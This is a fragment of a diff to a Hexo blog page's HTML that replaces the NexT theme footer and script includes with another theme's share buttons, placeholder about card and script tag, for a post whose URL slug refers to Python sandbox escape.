 
 
-<div class="powered-by">
-  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
-</div>
+                </div>
+                
+    <div id="share-options-bar" class="share-options-bar" data-behavior="4">
+        <i id="btn-close-shareoptions" class="fa fa-times"></i>
+        <ul class="share-options">
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/13/python沙盒逃逸two/"
+                        aria-label="分享到 Facebook"
+                    >
+                        <i class="fab fa-facebook" aria-hidden="true"></i><span>分享到 Facebook</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/13/python沙盒逃逸two/"
+                        aria-label="分享到 Twitter"
+                    >
+                        <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://plus.google.com/share?url=http://yoursite.com/2019/09/13/python沙盒逃逸two/"
+                        aria-label="分享到 Google+"
+                    >
+                        <i class="fab fa-google-plus" aria-hidden="true"></i><span>分享到 Google+</span>
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
 
-<div class="theme-info">
-  Theme -
-  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
-    NexT.Muse
-  </a>
-</div>
 
-
+            
+        </div>
         
 
+
+<div id="about">
+    <div id="about-card">
+        <div id="about-btn-close">
+            <i class="fa fa-times"></i>
+        </div>
         
-      </div>
-    </footer>
+            <h4 id="about-card-name">John Doe</h4>
+        
+            <div id="about-card-bio"><p>author.bio</p>
+</div>
+        
+        
+            <div id="about-card-job">
+                <i class="fa fa-briefcase"></i>
+                <br/>
+                <p>author.job</p>
+
+            </div>
+        
+        
+    </div>
+</div>
+
+        
+        
+<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
+        <!--SCRIPTS-->
+<script src="/assets/js/script-hvks0tjho7hhxxjwgvjgerqzsheh4pu8sgih6uruqsx2fdeiyiflclfy2v4q.min.js"></script>
+<!--SCRIPTS END-->
+
 
     
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
-    
 
-  </div>
 
-  
 
-<script type="text/javascript">
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
-</script>
 
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
-
-  
-  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
-
-  
-  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
-
-  
-  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-
-  
-  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-  
-  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
-
-  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
-
-
-
-  
-  
-
-  
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
-
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
-
-
-
-  
-
-
-  
-
-
-
-
-	
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-</body>
+    </body>
 </html>
